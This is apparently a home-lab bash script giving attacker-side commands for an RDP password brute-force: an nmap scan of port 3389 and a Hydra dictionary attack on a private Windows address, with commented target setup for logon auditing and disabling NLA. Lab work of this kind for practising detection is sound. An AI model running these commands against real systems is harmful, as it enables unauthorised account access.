#!/usr/bin/env bash
# ============================================================
# RDP Brute-Force — attacker-side commands (Kali Linux)
# LAB USE ONLY. Run exclusively against systems you own.
# Attacker: 192.168.100.134 (Kali)  |  Target: 192.168.100.135 (Windows)
# ============================================================

# --- Phase 1: Reconnaissance — confirm RDP is open ---
sudo nmap -sV -p 3389 192.168.100.135

# --- Phase 2: Dictionary brute-force against RDP ---
# Wordlist (~/password.txt) holds ~20 common + lab-themed passwords.
# -l cyber  : target username
# -P        : password list
# -V        : verbose (show each attempt)
# -t 1      : single thread (FreeRDP module is unstable at higher concurrency)
hydra -l cyber -P ~/password.txt -V -t 1 rdp://192.168.100.135

# ------------------------------------------------------------
# Target-side prerequisites (Windows 'homelabvm'), run in elevated PowerShell:
#
#   # Enable failed-logon auditing so attempts generate Event ID 4625
#   auditpol /set /subcategory:"Logon" /success:enable /failure:enable
#
#   # (Lab only) NLA was disabled so Hydra's FreeRDP module could reach the
#   # logon stage. Leaving NLA ENABLED is a recommended real-world control.
# ------------------------------------------------------------
